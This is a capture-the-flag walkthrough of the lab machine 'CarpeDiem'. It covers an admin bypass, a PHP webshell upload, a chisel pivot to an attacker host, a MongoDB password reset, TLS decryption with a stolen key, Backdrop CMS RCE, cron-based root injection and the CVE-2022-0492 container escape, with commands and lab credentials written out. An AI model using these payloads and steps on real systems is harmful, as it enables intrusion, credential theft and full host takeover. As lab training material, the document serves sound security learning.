# CarpeDiem

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.179
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 05:45 EDT
Nmap scan report for 10.129.227.179
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Web Enum

Port 80 hosted a website that had a countdown to a domain being launched.

<figure><img src="../../../.gitbook/assets/image (941).png" alt=""><figcaption></figcaption></figure>

There was nothing interesting about this website. The search there is static. We can do a `gobuster` directory and `wfuzz` subdomain scan. `gobuster` only picked up on static site files, but `wfuzz` picked up on a `portal` endpoint:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host:FUZZ.carpediem.htb' --hw=161 -u http://carpediem.htb  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://carpediem.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000048:   200        462 L    2174 W     31090 Ch    "portal"
```

### Admin Bypass --> File Upload

This was running some motorcycle store portal:

<figure><img src="../../../.gitbook/assets/image (2186).png" alt=""><figcaption></figcaption></figure>

We can create an account with the site. After registering, we can update our profile:

<figure><img src="../../../.gitbook/assets/image (2426).png" alt=""><figcaption></figcaption></figure>

This is the request generated:

{% code overflow="wrap" %}
```http
POST /classes/Master.php?f=update_account HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 115
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=edit_account
Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a



id=25&login_type=2&firstname=test&lastname=test&contact=test&gender=Male&address=test123&username=test123&password=
```
{% endcode %}

There's a `login_type` parameter set at 2, so let's change that to 1 and we might become an administrator. I tested this by visiting `/admin` and it worked:

<figure><img src="../../../.gitbook/assets/image (732).png" alt=""><figcaption></figcaption></figure>

When looking around, we can see there's a Quartely Sales Report part hwhere we can upload files:

<figure><img src="../../../.gitbook/assets/image (3331).png" alt=""><figcaption></figcaption></figure>

The upload functions still being in development might mean this is vulnerable. I tried clicking on Add, but it did nothing. When inspecting the traffic, we can see it making POST requests to `/classes/users.php?f=upload`.

<figure><img src="../../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>

This accepts form-data and also is a PHP-based website (as from X-Powered-By), so let's try to upload a PHP webshell. I took some requests I had from other machines / scripts that also uploaded form-data.

```http
POST /classes/Users.php?f=upload HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/admin/?page=maintenance/files
Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a
Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
Content-Length: 268

-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name="file_upload"; filename="a.html"
Content-Type: text/html

<!DOCTYPE html><title>Content of a.html.</title>

-----------------------------9051914041544843365972754266--
```

The above request works and it will be uploaded:

<figure><img src="../../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

Now we can try to upload a PHP webshell using an image in `Content-Type` because there's a check for that.

```http
POST /classes/Users.php?f=upload HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/admin/?page=maintenance/files
Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a
Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
Content-Length: 253



-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name="file_upload"; filename="b.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>

-----------------------------9051914041544843365972754266--
```

Then we can verify it works:

```
$ curl http://portal.carpediem.htb/uploads/1683799320_b.php?cmd=id      
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then, we can get an easy reverse shell.

<figure><img src="../../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

## Docker Escape

### MySQL Creds --> Chisel

When looking around the Docker container, we can find some MySQL Creds:

```
www-data@3c371615b7aa:/var/www/html/portal$ head -n 10  classes/DBConnection.p>
<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = 'mysql';
    private $username = 'portaldb';
    private $password = 'J5tnqsXpyzkK4XNt';
    private $database = 'portal';
```

This a container with nothing in it, but there's bound to be others that are around somewhere. I started doing ping sweeps to see which hosts are alive.

```bash
for i in {1..255}; do ping -c 1 172.$i.0.1; done
```

I ran this for a while and found that we are on the 172.17.0.0/24 subnet. Afterwards, I did another ping sweep on 172.17.0.0/24.

```
for i in {1..255}; do ping -c 1 172.17.0.$i; done
64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.071 ms
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.067 ms
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.060 ms
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.060 ms
64 bytes from 172.17.0.5: icmp_seq=0 ttl=64 time=0.051 ms
64 bytes from 172.17.0.6: icmp_seq=0 ttl=64 time=0.033 ms
```

I was lazy to cut the input, but basically 172.17.0.1 - 6 are alive. Now we can download `nmap` to the machine and scan these ports.

```
www-data@3c371615b7aa:/tmp$ ./nmap_binary -p- --min-rate 10000 172.17.0.1-6

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-05-11 10:14 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.000069s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.17.0.2
Host is up (0.00027s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https

Nmap scan report for mysql (172.17.0.3)
Host is up (0.00021s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  mysql
33060/tcp open  unknown

Nmap scan report for 172.17.0.4
Host is up (0.00026s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

Nmap scan report for 172.17.0.5
Host is up (0.00029s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8118/tcp open  unknown

Nmap scan report for 3c371615b7aa (172.17.0.6)
Host is up (0.000055s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
```

It appears that 172.17.0.3 has the MySQL instance, and 0.4 has the MongoDB instance. We can first pivot to the .0.3 instance using `chisel`.

```bash
# on kali
chisel server -p 5555 --reverse
# on host
./chisel client 10.10.14.13:5555 R:3306:172.17.0.3:3306
```

Afterwards, we can access the database:

```
$ mysql -h 127.0.0.1 -u portaldb -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 188
Server version: 8.0.27 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

We can find the `users` table to see that Jeremy Hammond is the user with a hash:

```
MySQL [portal]> select * from users\g
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
| id | firstname | lastname | gender | contact                | username | password                         | address | avatar                            | last_login | login_type | date_added          | date_updated        |
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
|  1 | Jeremy    | Hammond  | Male   | jhammond@carpediem.htb | admin    | b723e511b084ab84b44235d82da572f3 |         | uploads/1635793020_HONDA_XADV.png | NULL       |          1 | 2021-01-20 14:02:37 | 2022-04-01 23:34:50 |
| 25 | test      | test     | Male   | test                   | test123  | cc03e747a6afbbcbf8be7668acfebee5 | test123 | NULL                              | NULL       |          1 | 2023-05-11 09:50:33 | 2023-05-11 09:51:37 |
+----+-----------+----------+--------+------------------------+----------+----------------------------------+---------+-----------------------------------+------------+------------+---------------------+---------------------+
```

This hash cannot be cracked, so that's a waste.

### Docker Enum

Since we are still pivoting, we can enumerate the other services. We just need to change the `chisel` command to use `R:socks` to let us use `proxychains` to access the rest. Let's enumerate this sytematrically:

#### 172.17.0.2

On 172.17.0.2, there's a `backdrop.carpediem.htb` site:

<figure><img src="../../../.gitbook/assets/image (1643).png" alt=""><figcaption></figcaption></figure>

There's also a FTP server that accepts anonymous credentials, but we can't do much with it as it just hangs. Not much for this host in general.

#### 172.17.0.4

This is the host that has MongoDB running. We can connect using `proxychains mongo`.

```
$ proxychains mongo 172.17.0.4
> show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
trudesk  0.001GB
> use trudesk
switched to db trudesk
> show collections
accounts
counters
departments
groups
messages
notifications
priorities
role_order
roles
sessions
settings
tags
teams
templates
tickets
tickettypes
```

This was interesting, and we'll keep this in mind for now.

#### 172.17.0.5

This host was running Trudesk on port 8118 (which is exactly what the MongoDB instance is for). We can directly add `trudesk.carpediem.htb` and access it on port 80 (without proxychains).

<figure><img src="../../../.gitbook/assets/image (2412).png" alt=""><figcaption></figcaption></figure>

We don't have valid credentials (yet), so we can't login.

### Reset Password --> Ticket Enum

Since we have access toe the MongoDB for Trudesk, we can just reset the password for the administrator.

```
db.getCollection("accounts").update({"_id":ObjectId("623c8b20855cc5001a8ba13c")},{$set:{"password":"$2a$10$uL4uO5nHLkSFdZ3Wed2eBeYPtolnWG9CnWmGYqE/pjwSkoogU9kc."}});
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

This would reset the admin password to 'hello'. Then we can login to Trudesk. Here, we can read the tickets that are present:

<figure><img src="../../../.gitbook/assets/image (4045).png" alt=""><figcaption></figcaption></figure>

Horace Flaccus is a new user present in the fictional company, and when we see the ticket, it hints that we have to use `zoiper` to call something to get the password.

<figure><img src="../../../.gitbook/assets/image (3355).png" alt=""><figcaption></figcaption></figure>

Interesting! We can download Zoiper from here:

{% embed url="https://www.zoiper.com/" %}

### Zoiper --> SSH

We can download and install Zoiper via `sudo dpkg -i <zoiper>.deb`. Then, we can run `zoiper5` to launch it:

<figure><img src="../../../.gitbook/assets/image (1030).png" alt=""><figcaption></figcaption></figure>

We can continue as a free user, and enter these to 'login'.

<figure><img src="../../../.gitbook/assets/image (2006).png" alt=""><figcaption></figcaption></figure>

We can skip the proxy part, and it seesms that both IAX UDP and SIP UDP works for this box:

<figure><img src="../../../.gitbook/assets/image (3122).png" alt=""><figcaption></figcaption></figure>

Then, we can call `*62` to get the voicemail.

<figure><img src="../../../.gitbook/assets/image (3893).png" alt=""><figcaption></figcaption></figure>

When it asks for a Password, type `2022`. Then press `1`. The voicemail should play and here's the contents:

{% code overflow="wrap" %}
```
Hey Horance, welcome aboard! We certainly needed more network engineers to assist with the infrastructure. Your account is ready to go. Your password is AuRj4pxq9qPk. Please reset it at your earliest convenience, as well as your phone pin code. Let me know if you have any issues. Robert
```
{% endcode %}

Using this, we can easily SSH in as `hflaccus`.

<figure><img src="../../../.gitbook/assets/image (746).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sniffing --> Weak TLS

I ran a LinPEAS scan on the machine, there's some interesting output:

{% code overflow="wrap" %}
```
[+] Can I sniff with tcpdump?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing                                            
You can sniff with tcpdump!  

/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
{% endcode %}

For some reason, we can sniff all traffic on the host. Using this, I just sniffed traffic on the Docker subnet and left it for a few minutes. After a while, we can download the `.pcap` file back to our machine:

```bash
tcpdump -ni docker0 -s 65535 -w docker.pcap
```

Then, we can take a look at this within `wireshark`. There's some traffic between the MongoDB and the Trudesk instance, but I have already exploited and viewed all the stuff within that, so there's no need to investigate that.

Instead, we can take a look at all the TLS traffic to the `backdrop.carpediem.htb` host. Within the Server Hello messages, TLS decides on the protocol that is to be used. In this case, the machine uses this:

<figure><img src="../../../.gitbook/assets/image (2242).png" alt=""><figcaption></figcaption></figure>

A bit of Googling shows that this is a Weak Cipher Suite:

{% embed url="https://ciphersuite.info/cs/TLS_RSA_WITH_AES_256_CBC_SHA256/" %}

This cipher does not provide Perfect Forward Secrecy, meaning that we can decrypt all the past messages if we have the key. Googling about SSL keys and certificates tells us that it is located in the `/etc/ssl` file:

{% embed url="https://ubuntu.com/server/docs/security-certificates" %}

Within the `/etc/ssl/certs` file, we can find some keys that look out of place:

<figure><img src="../../../.gitbook/assets/image (3747).png" alt=""><figcaption></figcaption></figure>

We can download this back to our machine. Then we can use `wireshark` to decrypt the TLS traffic.

{% embed url="https://resources.infosecinstitute.com/topic/decrypting-ssl-tls-traffic-with-wireshark/" %}

We can dd the `.key` file here:

<figure><img src="../../../.gitbook/assets/image (3836).png" alt=""><figcaption></figcaption></figure>

After that, save the changes and we would see some of the traffic become unencrypted HTTP:

<figure><img src="../../../.gitbook/assets/image (3090).png" alt=""><figcaption></figcaption></figure>

We can foloow the HTTP stream to see this:

{% code overflow="wrap" %}
```http
POST /?q=user/login HTTP/1.1
Host: backdrop.carpediem.htb:8002
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Origin: https://backdrop.carpediem.htb:8002
Content-Type: application/x-www-form-urlencoded
Referer: https://backdrop.carpediem.htb:8002/?q=user/login
Accept-Language: en-US,en;q=0.9
Content-Length: 128

name=jpardella&pass=tGPN6AmJDZwYWdhY&form_build_id=form-rXfWvmvOz0ihcfyBBwhTF3TzC8jkPBx4LvUBrdAIsU8&form_id=user_login&op=Log+in
```
{% endcode %}

We have new credentials! We can use this to login to `backdrop.carpediem.htb` and enumerate.

### Backdrop RCE

We can login using the credentials we found:

<figure><img src="../../../.gitbook/assets/image (1208).png" alt=""><figcaption></figcaption></figure>

There is an RCE for this that involves CSRF, but since I'm the administrator, I don't need to do CSRF. I can directly do the RCE.

{% embed url="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS" %}

```
wget https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar
```

Head to Functionality > Install New Modules > Manual Installation > Upload the .tar file. Then, install it and we can check the RCE:

```
$ proxychains curl -k https://172.17.0.2/modules/reference/shell.php?cmd=id
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:443  ...  OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then, we can get another reverse shell on this Docker container.

<figure><img src="../../../.gitbook/assets/image (3552).png" alt=""><figcaption></figcaption></figure>

There's no Python on this, so we have to use `script /dev/null -c bash` to upgrade our shell.

### Docker Root

There is a `heartbeat.sh` script within the `/opt` directory.

```
www-data@90c7f522b842:/opt$ ls -la
total 12
drwxr-xr-x 1 root root 4096 Jun 23  2022 .
drwxr-xr-x 1 root root 4096 May 11 06:05 ..
-rwxr-xr-x 1 root root  510 Jun 23  2022 heartbeat.sh
```

Here's its contents:

{% code overflow="wrap" %}
```bash
#!/bin/bash
#Run a site availability check every 10 seconds via cron
checksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
if [[ $checksum != "70a121c0202a33567101e2330c069b34" ]]; then
        exit
fi
status=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)
grep "Welcome to backdrop.carpediem.htb!" "$status"
if [[ "$?" != 0 ]]; then
        #something went wrong.  restoring from backup.
        cp /root/index.php /var/www/html/backdrop/index.php
fi
```
{% endcode %}

This script is being contunously run, and it seems to make run `backdrop.sh` using `php`. It also cehcks for the integrity of `backdrop.sh`, so we cannot change that script. Also, it seems to restore `index.php` file when something goes wrong.

The rest of the command executed seems to execute the root page in PHP, which is `index.php`, of which I have control of. We can drop a simple `system('bash /tmp/shell');` into `index.php` to get another reverse shell as `root`.

First, drop a reverse shell as `/tmp/shell.sh`, then append the `/var/www/html/backdrop/index.php` page with `system("bash /tmp/shell.sh");` and wait for execution.

<figure><img src="../../../.gitbook/assets/image (3384).png" alt=""><figcaption></figcaption></figure>

### CVE-2022-0492 --> Rooted!

Now that we are `root` on the Docker, let's try to find a way to escape this. When this box was published, there was a new Docker breakout technique related to `cgroups`. This is in-line with when the box was released.

There are some PoCs online to allow us to execute commands on the actual main machine:

{% embed url="https://github.com/chenaotian/CVE-2022-0492" %}

We can download and run this:

```
root@90c7f522b842:/tmp# ./exp.sh 'chmod u+s /bin/bash'
[-] You donot have CAP_SYS_ADMIN, will try
umount: /tmp/testcgroup: target is busy.
[+] Escape Success with unshare!
```

Afterwards, we can `ssh` back into the main machine and get a `root` shell easily:

<figure><img src="../../../.gitbook/assets/image (730).png" alt=""><figcaption></figcaption></figure>

Fun machine, really long though!
